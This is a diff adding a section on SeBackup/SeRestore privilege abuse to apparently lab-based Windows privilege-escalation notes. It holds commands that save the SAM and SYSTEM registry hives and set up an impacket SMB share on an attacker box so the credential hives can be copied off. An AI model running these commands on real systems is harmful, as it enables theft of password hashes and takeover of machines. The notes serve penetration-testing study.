@@ -92,3 +92,31 @@ Each service on a Windows machine will have an associated executable which will 
 Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges.
 
 All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\ .
+
+
+## SeBackup / SeRestore
+
+The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
+
+**Verfiy your privileges**
+
+```JavaScript
+whoami /priv
+```
+
+**To backup the SAM and SYSTEM hashes, we can use the following commands**
+
+```JavaScript
+reg save hklm\system C:\Users\THMBackup\system.hive
+
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+
+This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
+
+```JavaScript
+mkdir share
+
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
